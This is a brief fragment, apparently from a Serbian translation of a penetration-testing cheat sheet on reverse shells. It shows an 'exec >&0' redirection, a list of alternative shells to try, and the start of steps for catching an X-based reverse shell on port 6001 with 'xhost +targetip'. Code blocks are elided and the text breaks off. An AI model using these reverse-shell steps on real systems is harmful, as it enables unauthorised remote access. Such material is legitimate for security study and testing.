...
exec >&0
```
Не заборавите да проверите и друге шкољке: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh и bash.

### Симбол безбедна шкољка
```bash
...
```
Da biste uhvatili obrnuti shell, možete koristiti (koji će slušati na portu 6001):
```bash
# Authorize host
xhost +targetip
# Listen
